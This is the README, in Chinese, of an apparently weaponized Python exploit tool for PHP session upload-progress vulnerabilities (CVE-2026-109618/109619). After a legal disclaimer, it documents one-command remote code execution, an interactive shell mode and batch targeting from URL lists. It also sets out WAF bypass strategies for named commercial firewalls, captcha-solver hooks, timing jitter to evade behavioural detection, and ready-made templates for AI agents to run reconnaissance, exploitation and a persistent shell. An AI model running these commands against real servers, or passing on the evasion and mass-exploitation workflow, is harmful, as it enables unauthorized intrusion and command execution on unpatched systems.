# php2shell_exp.py — 武器化 EXP 使用说明

**当前版本：V1.0.1**（统一更新版；版本历史见 [CHANGELOG.md](CHANGELOG.md)）

CVE-2026-109618 / CVE-2026-109619（PHP2Shell）全自动化武器化利用工具 · WAF 对抗强化版
Python 3.8+ · 纯标准库 · 零依赖 · 零交互 · 支持 CMD / CLI / PowerShell / Agent 一键调用

---

## 免责声明

本项目（包括但不限于 `php2shell_exp.py`、`BYPASS_TECHNIQUES.md`、`skills/` 下的技能文件及相关文档，以下统称"本项目"）仅面向**合法授权的安全测试、漏洞研究、学术教学、防御验证与蓝队分析等合法场景**场景。本项目以安全研究为目的公开，不构成对任何具体目标的攻击授权、邀请或协助。

1. **授权前提**：使用本项目对任何系统、网络或应用进行测试前，您必须已获得目标资产所有者明确的、书面的授权，且测试范围、时间窗口与手段均在授权范围内。对自身拥有或合法控制的实验环境进行测试同样适用。
2. **禁止行为**：严禁将本项目用于任何未经授权的访问、入侵、提权、数据获取或破坏行为；严禁用于攻击关键信息基础设施、公共服务平台或任何第三方系统；严禁用于牟利、勒索、敲诈或其他违法犯罪活动。
3. **法律合规**：使用者应自行了解并遵守所在国家/地区的法律法规，包括但不限于《中华人民共和国网络安全法》《中华人民共和国刑法》第二百八十五条、第二百八十六条及相关司法解释。因使用本项目产生的一切法律责任由使用者自行承担。
4. **无担保**：本项目按"现状"（AS IS）提供，不附带任何明示或暗示的担保，包括但不限于适销性、特定用途适用性与不侵权担保。作者与贡献者不对工具的准确性、完整性、稳定性或使用效果作出任何承诺。
5. **责任限制**：在任何情况下，作者与贡献者均不对因使用或无法使用本项目而导致的任何直接、间接、偶然、特殊或后果性损失（包括但不限于数据丢失、业务中断、法律责任、经济损失）承担责任。
6. **漏洞披露**：若您在使用过程中发现新的安全问题，请优先通过 GitHub Security Advisory 或私下渠道联系维护者，并给予合理的修复窗口，避免公开可直接利用的细节。
7. **使用即同意**：下载、复制、编译、运行或以任何方式使用本项目，即视为您已阅读、理解并同意本声明全部内容。如不同意，请立即停止使用并删除本项目全部副本。

本项目采用 AGPL-3.0 许可证，许可证条款与本声明并行适用；如两者存在冲突，以更严格者为准。

---

## 1. 一句话上手

```bash
python php2shell_exp.py auto https://TARGET/ --flag-cmd "echo hello word > flag.txt && cat flag.txt"
```

自动完成：防御识别 → 策略选择 → WAF 绕过 → 利用 → flag 落地 → 回显验证 → 停火 → JSONL 报告。

## 2. 攻击面与支持版本

- 触发点：`php_session_rfc1867_callback`（ext/session/session.c），multipart POST 到 PHP SAPI。

### 2.1 EXP 支持攻击的 PHP 版本

| PHP 版本 | EXP 攻击能力 | 实测证据 |
| --- | --- | --- |
| **7.4.33 / 8.0.30 / 8.1.33**（EOL 分支末位版本） | ✅ **一键 RCE**（hijack 链） | 官方正式版全通过（[TEST_REPORT.md](TEST_REPORT.md) §8） |
| **8.2.34 / 8.3.35**（受支持分支受影响段末位） | ✅ **一键 RCE** | 官方正式版全通过 |
| **8.4.26 / 8.5.11**（vs17 工具集新分支） | ✅ **一键 RCE** | 官方正式版全通过 |
| 5.4.0 – 7.3.x（更早分支） | ✅ 机制同一（同一 hijack 链） | 载荷语法自 PHP 5.2.1+/7.2+ 生效，未逐一部署 |
| **8.2.35 / 8.3.36 / 8.4.27 / 8.5.12**（修复版） | ⚠️ 主链关闭（rfc1867 期实例化 + serializer 泄漏）；**per-directory 混淆链仍可利用** | 8.2.35 对照实测（TEST_REPORT §7 R7） |

- **影响范围：PHP 5.4.0 – 8.5.11**；修复版本（2026-10-21，仅受支持分支）：8.5.12 / 8.4.27 /
  8.3.36 / 8.2.35。**5.4~8.1 为 EOL 分支，官方无修复、永久受影响。**
- **链路硬前提**（缺一则链不成立）：`session.upload_progress.cleanup=Off` + seed 目录
  `session.serialize_handler=php_serialize` / trigger 目录默认 `php` 的**目录级不一致**
  （完整前提清单见 [RESEARCH.md](RESEARCH.md) §5）。
- 载荷兼容性：`O:+N:`（长度 `+` 号）与 `S:` 十六进制转义（PHP 5.2.1+）经公开 WP/取证验证语义成立 —— **PHP 7.4 全兼容**。
- 实测一键通杀（单条 `auto` 命令 → `rce_confirmed` + flag 落地）：7.4.33 / 8.0.30 / 8.1.33 /
  8.2.34 / 8.3.35 / 8.4.26 / 8.5.11 共 **7/7 版本全通过**，证据见 [TEST_REPORT.md](TEST_REPORT.md) §7-§8。

## 3. 子命令

| 子命令 | 用途 | 网络行为 |
| --- | --- | --- |
| **`shell`** | **RCE 本体功能 + 稳定通道**：一键自动建链（端点/gadget/分隔符自发现），`--cmd` 单次 / stdin 逐行循环 / `--json` Agent 模式 | 主动 |
| `auto` | 全自动流水线：识别→绕过→利用→后续操作→报告 | 主动 |
| `check` | 仅指纹（PHP 版本 + WAF 堆叠识别 + 补丁判定） | 被动 GET |
| `exploit` | 手动指定单链精确射击 | 主动 |
| `build` | 离线生成载荷体（Burp 重放/调试用） | 无网络 |

> **定位**：EXP 的核心能力是 **RCE（任意命令执行）**。`--flag-cmd`/flag.txt 仅是授权测试的
> 验证场景之一，不是 EXP 的功能边界——`shell` 才是主接口。

### shell 用法（RCE 主接口 + 稳定通道）

```bash
# 一键建立稳定 shell 通道（端点/gadget/prop/命令分隔符全自动发现）
python php2shell_exp.py shell https://TARGET/
#   > id
#   > cat /etc/passwd
#   > exit

# Agent/AI 集成（首行输出通道信息，此后每命令一行 JSON）
python php2shell_exp.py shell https://TARGET/ --json

# 单命令 / 精确指定端点
python php2shell_exp.py shell https://TARGET/ --seed-path /SEED_PATH --trigger-path /TRIGGER_PATH \
  --gadget GADGET --prop PROP --cmd "COMMAND"
```

> 通道自动建立：探测 gadget/prop 并**自动识别命令分隔符**（sh `;` / cmd.exe `&`）；输出以
> `__P2S_B/E_<tok>__` 标记限界提取——告警/HTML/页面噪声天然剔除，stderr 经分组包装整链归并；
> 瞬时抖动自动重试；stdin 输入已净化 BOM/零宽字符。建链信息输出在 stderr（stdout 可直接管道给 Agent）。

## 4. 参数总表

### 4.1 目标输入（auto/check/exploit 通用）

| 参数 | 默认 | 说明 |
| --- | --- | --- |
| `URL`（位置参数） | — | 目标地址，http/https 均可 |
| `-f, --file` | — | 批量目标清单（每行一个 URL，# 注释） |
| `--timeout` | 15 | 单请求超时秒 |
| `--verify-tls` | 关 | 校验 TLS 证书 |

### 4.2 WAF 绕过（核心）

| 参数 | 默认 | 说明 |
| --- | --- | --- |
| `--bypass-level` | 3 | 绕过强度 0=off 1=基础 2=+头部 3=+传输/参数全开 |
| `--try-all` | 关 | **全量策略逐一自动尝试**（多层 WAF 堆叠/未知 WAF 必用） |
| `--cookie` | — | 导入人工过挑战的会话 Cookie |
| `--warmup` | 关 | 预热采集 WAF 追踪 Cookie（acw_tc 等）复用 |
| `--solver-cmd` | — | 外部滑块/人机求解器命令（stdout 输出放行 Cookie） |
| `--jitter` | 2.0 | 射击间拟人抖动基数秒（行为/ML 对抗，触顶自动退避 ×1.5≤30s） |
| `--variant` | 全部 | `pipe_object`（\|前缀+强制失败尾，默认）/ `pipe_clean`（公开 PoC 原始格式）子集 |
| `--seed-mode` | full | **full=完整发送（默认；需 `cleanup=Off`——官方实测唯一可靠持久化路径）** / abort=在途窗口实验模式（官方 8.2.34 实测会话仅在解析完成时写盘，上传中窗口不存在；详见 TEST_REPORT §7） |
| `--seed-url` | — | 投毒端点完整 URL（handler 混淆链可与触发端点分属不同 vhost/端口实例） |
| `--trigger-url` | — | 触发端点完整 URL（与 `--seed-url` 配对使用） |

### 4.3 利用与后续操作

| 参数 | 默认 | 说明 |
| --- | --- | --- |
| `--cmd` | `echo P2S_<token>` | 利用后执行命令（默认无害标记，仅回显判定） |
| `--expect` | 自动取 token | 命中判定字符串 |
| `--flag-cmd` | — | **绕过成功后自动执行的后续操作**（如落地 flag） |
| `--flag-expect` | `hello word` | 后续操作成功判据 |
| `--seed-path` / `--trigger-path` | 自动发现 | 精确指定投毒/触发端点（已知路径时可压到 2 请求） |
| `--seed-wordlist` 等 4 个 wordlist | 内置 | 端点/gadget/prop 字典文件覆盖 |
| `--max-attempts` | 64 | hijack 矩阵射击上限 |
| `--no-uaf` | 关 | 跳过 uaf 链 |

### 4.4 uaf 链（CVE-2026-109619 真实触发：plant → 解码 OOM → 悬垂复用 → 崩溃）

| 参数 | 说明 |
| --- | --- |
| `--uaf-size-mb` | plant 载荷大小（默认 12，需大于目标 `memory_limit`） |
| `--stall` | 请求间停滞秒（同 worker 亲和窗口） |

> 公开 ASAN 复现结论：崩溃确定性、预认证；**RCE 条件化**（sink + ASLR 泄漏 + 堆排布，build 相关）。
> 自动化只判 `crash_signal`，不做 RCE 承诺；已被取证证伪的“伪造 delta CALL_ADDR”机制已移除。

### 4.5 持续测试与输出

| 参数 | 默认 | 说明 |
| --- | --- | --- |
| `--rounds` | 1 | 持续测试轮次（未确认前循环，命中即停） |
| `--sleep` | 5 | 轮次间隔秒 |
| `-o, --output` | report.jsonl | JSONL 结果（断点续跑，自动跳过已确认目标） |
| `--workers` | 8 | 批量并发 |
| `--force` | 关 | 对指纹已修补目标也执行 |

### 4.6 退出码（自动化集成）

`0`=RCE 确认 · `2`=疑似漏洞/崩溃/armed（`exploit --chain uaf` 崩溃命中同为 `2`）· `1`=全部不可达 · `3`=单链未命中 · `4`=无发现/无新任务

## 5. 支持的 WAF/防御与自动绕过矩阵

| 防御类型 | 识别方式 | 自动绕过策略 | 状态 |
| --- | --- | --- | --- |
| 阿里云 WAF/ESA | aliyun_waf_aa/acw_tc/captchaV2 | plus_len/serp_hex/warmup_cookie/junk_headers… | ✅ 实测过语义层 |
| 南墙 WAF（NQWAF） | nqwaf/X-NQ-WAF 头 | plus_len/serp_hex/uri_double_enc/hpp/ct_case/chunked… | ✅ 模板已内置 |
| 宝塔 WAF（bt_panel/aaWAF） | X-BT-/bt_waf/aaWAF | plus_len/serp_hex/ct_space/hpp/bnd_long/junk_field… | ✅ 模板已内置 |
| 多层堆叠（阿里云+南墙+宝塔） | waf_stacked（≥2 命中） | **全策略并集逐一尝试** | ✅ 自动切换 |
| Cloudflare/Akamai/AWS/Incapsula | 各自指纹 | 专属优先级表 | ✅ 模板已内置 |
| ModSecurity/安全狗/云锁/nginx-lua | 各自指纹 | 专属优先级表 | ✅ 模板已内置 |
| 语义识别（对象注入特征） | 攻击串拦截/干净串放行对比 | **plus_len（`O:+N:`）+ serp_hex（`S:` 转义）** | ✅ 404 实证 |
| 体积策略（~2KB 阈值） | 1500B/3000B 两点探测 | serp_frag 流式分片 + 载荷体压缩 | ✅ 404/200 实证 |
| 人机验证（滑块/JS 挑战） | captcha/token 标记 | warmup Cookie / `--cookie` 导入 / `--solver-cmd` | ✅ 接口就绪 |
| 行为/ML 异常预算 | 同形态突发临时封禁 | jitter 拟人 + 诱饵稀释 + 自动退避 + `--rounds` 窗口化 | ✅ 实证恢复 |
| 方法策略（POST 封禁） | GET 过 POST 拦 | post_403 12 变体自适应 | ⚠️ 策略级封禁需加白/源站面 |
| 频率限制 | 6 连发探针 | jitter + 退避 | ✅ |

## 6. 多场景调用模板（Agent/自动化）

### CMD（Windows）
```cmd
python php2shell_exp.py auto https://TARGET/ --bypass-level 3 --try-all --jitter 8 --flag-cmd "echo hello word > flag.txt && type flag.txt" -o report.jsonl
```

### PowerShell
```powershell
python php2shell_exp.py check https://TARGET/ --json 2>$null | ConvertFrom-Json
python php2shell_exp.py auto https://TARGET/ --try-all --flag-cmd "echo hello word > flag.txt && cat flag.txt"; "EXIT=$LASTEXITCODE"
```

### Bash/CLI 批量
```bash
python php2shell_exp.py auto -f targets.txt --workers 16 --jitter 8 --rounds 5 --sleep 60 -o report.jsonl
jq 'select(.verdict=="rce_confirmed") | {target, via, flag_stage}' report.jsonl
```

### Agent 最小调用（三步：侦察→通杀→稳定通道）
```bash
# 1. 侦察（被动）
python php2shell_exp.py check https://TARGET/
# 2. 全自动利用+flag
python php2shell_exp.py auto https://TARGET/ --try-all --flag-cmd "echo hello word > flag.txt && cat flag.txt" --flag-expect "hello word"
# 结果解析：读 report.jsonl 最后一行 JSON 的 verdict / via / flag_stage.rce_hit
# 3. 后续操作：稳定 shell 通道（stdout 每行 JSON，直接管道消费）
echo "id" | python php2shell_exp.py shell https://TARGET/ --json
```

### 已知精确路径时（最小请求量，2 请求出结果）
```bash
python php2shell_exp.py exploit https://TARGET/ --chain hijack \
  --seed-path /app/seed.php --trigger-path /api/app.php --gadget Logger --prop cmd \
  --cmd "id" --expect "uid="
```

## 7. 结果判读

| verdict | 含义 | 后续动作 |
| --- | --- | --- |
| `rce_confirmed` | 命令执行确认（flag_stage=true 即 flag 已落地） | 测试完成，按约定停火 |
| `armed` | lab 监控端点命中（upload_progress 已激活） | 换 gadget/变体续打 |
| `crash_signal` | worker 崩溃（502/503/连接断），CVE-2026-109619 触发命中（plant→OOM→悬垂复用） | RCE 条件化，人工续做（sink+泄漏+堆排布） |
| `challenge_blocked` | 人机验证拦截 | `--cookie` 导入或 `--solver-cmd` |
| `post_blocked` | POST 方法策略封禁（附 block_codes） | 需加白/源站面/换出口 |
| `likely_vulnerable_no_rce` | 版本面漏洞但链未命中 | 扩 gadget 字典/指定真实路径 |
| `skipped_patched` | 指纹为已修复版本 | 跳过 |

JSONL 每行含：fingerprint、defense（6 层防御画像+waf_stack）、discovery、chains（每射策略/状态码）、adaptive、flag_stage——可直接入库。
一键通杀辅助：`chain_prereq`（present=gadget 问题 / absent=前提缺失）+ `chain_prereq_hint`（修复指引）；
`adaptive` 含 `prereq_absent_early_stop@N` 表示第 N 射提前止损（前提缺失不再空转矩阵）。

> `decode_warning=true` 但无输出：gadget/属性不对，**或 seed 未持久化**（`cleanup=On`）。
> 注意（官方 8.2.35 实测）：per-directory handler 混淆链在补丁版上**仍可利用**——告警形态
> 不能作为补丁判据，可靠判据是 `check` 的版本面；根治需升级 **且**全目录统一 `session.serialize_handler`。

## 8. 安全与作业规范

- 默认载荷为无害标记 `echo P2S_<token>`；破坏性命令仅经 `--cmd/--flag-cmd` 显式指定。
- `auto` 命中 `rce_confirmed` 即矩阵停火；flag 阶段是唯一后续操作，无持久化/后门。
- 建议作业参数：`--bypass-level 3 --try-all --jitter 8 --rounds 5 --sleep 60`（低速窗口化，规避行为预算）。
- 仓库内 `flag.sample.txt` 仅为产物示例；目标端由 `--flag-cmd` 生成 `flag.txt`。勿在作业目录保留与 `--flag-expect` 同值的本地 flag.txt，避免污染判定基准。
- 自测：`python -m unittest discover -s tests`（纯标准库，改动后请先跑通）。
- 机制真实性依据：见 [RESEARCH.md](RESEARCH.md)（联网取证 + 官方补丁逆向 + 差异对照）。

## 9. 文档地图

| 文件 | 内容 |
| --- | --- |
| [Readme.md](Readme.md) | 使用说明 + 免责声明 + 参数总表 + 调用模板 + 结果判读（本文档） |
| [CHANGELOG.md](CHANGELOG.md) | 更新日志（版本历史与变更明细） |
| [RESEARCH.md](RESEARCH.md) | 联网取证 + 官方补丁逆向 + EXP 真假利用差异对照（机制依据） |
| [TEST_REPORT.md](TEST_REPORT.md) | 本地确定性测试报告（12 用例矩阵 + 通用武器化结论 + 环境销毁记录） |
| [BYPASS_TECHNIQUES.md](BYPASS_TECHNIQUES.md) | WAF/防御绕过技术文档（实证标注 ✅/🧪/📚 + 蓝队附录） |
| [USAGE.md](USAGE.md) | 参数总表（与 argparse 逐项对齐）+ JSONL 契约 |
| [skills/php2shell-exp/SKILL.md](skills/php2shell-exp/SKILL.md) | Agent/自动化操作技能（标准作业流程 + 判定决策树 + 排障） |
| [tests/test_core.py](tests/test_core.py) | 轻量自测（29 项，`python -m unittest discover -s tests`） |
| [php2shell_exp.py](php2shell_exp.py) | 唯一可执行入口（单文件、纯标准库） |
| [flag.sample.txt](flag.sample.txt) | flag 落地产物示例（目标端实际生成 `flag.txt`） |
| [LICENSE](LICENSE) | AGPL-3.0 |
